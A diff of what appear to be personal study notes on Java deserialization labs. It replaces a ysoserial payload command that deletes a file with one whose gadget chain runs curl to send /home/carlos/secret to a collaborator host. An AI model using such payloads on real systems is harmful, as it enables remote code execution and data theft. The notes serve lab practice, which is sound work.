@@ -39,7 +39,7 @@ Press <enter> to keep the current choice[*], or type selection number: 1
 example:
 
 ```shell
-java -jar /mnt/d/Downloads/ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
+java -jar /mnt/d/Downloads/ysoserial-all.jar CommonsCollections7 'curl http://collaborator -d @/home/carlos/secret' | base64 -w 0
 ```
 
 ## java deserialization scanner burpsuite + ysoserial
